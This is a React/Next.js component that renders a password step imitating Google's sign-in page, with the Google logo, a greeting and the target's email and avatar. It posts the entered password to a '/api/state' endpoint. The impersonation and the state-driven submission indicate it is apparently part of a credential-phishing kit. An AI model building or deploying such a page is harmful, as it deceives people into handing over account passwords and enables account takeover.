"use client";

import { useState } from "react";
import { useForm, type SubmitHandler } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import Image from "next/image";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { Eye, EyeOff, UserCircle } from "lucide-react";

const passwordSchema = z.object({
  password: z.string().min(1, { message: "Please enter your password." }),
});
type PasswordFormData = z.infer<typeof passwordSchema>;

type PasswordStepProps = {
  email: string;
  name: string;
  profilePicture: string;
};

export default function PasswordStep({ email, name, profilePicture }: PasswordStepProps) {
  const { register, handleSubmit, formState: { errors, isSubmitting } } = useForm<PasswordFormData>({
    resolver: zodResolver(passwordSchema),
  });
  const { toast } = useToast();
  const [showPassword, setShowPassword] = useState(false);

  const onSubmit: SubmitHandler<PasswordFormData> = async (data) => {
    try {
      const res = await fetch("/api/state", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "submitPassword", password: data.password }),
      });
      if (!res.ok) throw new Error("Server responded with an error.");
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Could not proceed. Please try again.",
      });
    }
  };

  return (
    <div className="w-full">
      <img width="48" height="48" src="https://img.icons8.com/color/48/google-logo.png" alt="google-logo" className="mb-4 mx-auto"/>
      <h1 className="text-2xl font-normal text-center">Welcome</h1>
      <div className="mt-4 flex items-center justify-center gap-2 rounded-full border p-1 pr-3 w-fit mx-auto">
        {profilePicture ? (
            <Image 
                src={profilePicture} 
                alt={name} 
                width={24} 
                height={24} 
                className="rounded-full w-6 h-6 object-cover"
                data-ai-hint="person avatar" 
            />
        ) : (
            <UserCircle className="h-6 w-6 text-muted-foreground"/>
        )}
        <span className="text-sm font-medium">{email}</span>
      </div>
      
      <form onSubmit={handleSubmit(onSubmit)} className="mt-8 space-y-6 text-left">
        <div className="relative">
          <Input
            id="password"
            type={showPassword ? "text" : "password"}
            placeholder="Enter your password"
            {...register("password")}
            className="h-14 pt-2 text-base pr-12"
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            className="absolute inset-y-0 right-0 flex items-center px-4 text-muted-foreground"
          >
            {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
          </button>
        </div>
        {errors.password && <p className="text-sm text-destructive mt-1 px-1 text-left">{errors.password.message}</p>}
        
        <div className="flex justify-between items-center pt-4">
          <Button variant="ghost" className="text-primary -ml-4">Forgot password?</Button>
          <Button type="submit" disabled={isSubmitting}>
            {isSubmitting ? "Verifying..." : "Next"}
          </Button>
        </div>
      </form>
    </div>
  );
}

    